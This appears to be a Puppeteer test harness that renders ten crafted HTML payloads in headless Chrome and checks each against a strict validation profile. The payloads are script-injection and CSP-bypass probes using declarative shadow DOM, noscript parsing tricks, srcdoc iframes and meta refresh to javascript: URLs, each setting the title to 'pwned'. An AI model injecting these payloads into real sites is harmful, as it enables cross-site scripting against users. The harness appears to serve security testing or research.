const puppeteer = require("puppeteer");

const CHROME = process.env.CHROME_PATH || "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
const sources = [
  `<!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div><template shadowrootmode="open"><script>document.title='pwned'<\/script></template></div></body></html>`,
  `<!doctype html><div><template shadowrootmode="open"><script>document.title='pwned'<\/script></template><meta http-equiv="content-security-policy" content="default-src 'none'"></div>`,
  `<!doctype html><head><noscript><meta http-equiv="content-security-policy" content="default-src 'none'"></noscript></head><body><div></div>`,
  `<!doctype html><head><noscript><a alt="</noscript><meta http-equiv='content-security-policy' content=&quot;default-src 'none'&quot;>"></a></noscript></head><body><div><script>document.title='pwned'<\/script></div>`,
  `<!doctype html><head><noscript><a alt="</noscript><script>document.title='pwned'<\/script><meta http-equiv='content-security-policy' content=&quot;default-src 'none'&quot;>"></a></noscript></head><body><div></div>`,
  `<!doctype html><head><noscript><a alt="</noscript><script>document.title='pwned'<\/script>"></a></noscript><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div></div>`,
  `<!doctype html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div><template shadowrootmode="open"><iframe srcdoc="<script>parent.document.title='pwned'<\/script>"></iframe></template></div></body>`,
  `<!doctype html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div><template shadowrootmode="open"><meta http-equiv="refresh" content="0;url=#pwned"></template></div></body>`,
  `<!doctype html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><meta http-equiv="refresh" content="0;url=javascript:document.title='pwned'"><div></div></body>`,
  `<!doctype html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div><template shadowrootmode="closed"><script>document.title='pwned'<\/script></template></div></body>`,
];

(async () => {
  const browser = await puppeteer.launch({ executablePath: CHROME, headless: "new" });
  for (const [sourceIndex, source] of sources.entries()) for (const enabled of [false, true]) {
    const page = await browser.newPage();
    await page.setJavaScriptEnabled(enabled);
    await page.setContent(source, { waitUntil: "domcontentloaded" });
    const result = await page.evaluate(({ enabled, sourceIndex }) => {
      const declaration = document.head.firstElementChild;
      const surface = document.body.firstElementChild;
      const attributeProfile = [
        [document.documentElement, []],
        [document.head, []],
        [document.body, []],
        [declaration, ["http-equiv", "content"]],
        [surface, []],
      ].every(([element, allowed]) => element
        && element.getAttributeNames().every((name) => allowed.includes(name)));
      return {
        sourceIndex,
        enabled,
        title: document.title,
        hash: location.hash,
        html: document.documentElement.outerHTML,
        head: document.head.innerHTML,
        body: document.body.innerHTML,
        hasShadow: Boolean(surface?.shadowRoot),
        shadowHtml: surface?.shadowRoot?.innerHTML,
        accepted: document.doctype?.name === "html"
          && document.head.childElementCount === 1
          && declaration?.localName === "meta"
          && declaration.httpEquiv.toLowerCase() === "content-security-policy"
          && declaration.content === "default-src 'none'"
          && document.body.childElementCount === 1
          && surface?.localName === "div"
          && surface.childElementCount === 0
          && document.body.textContent.trim() === ""
          && attributeProfile,
      };
    }, { enabled, sourceIndex });
    console.log(JSON.stringify(result));
    await page.close();
  }
  await browser.close();
})();
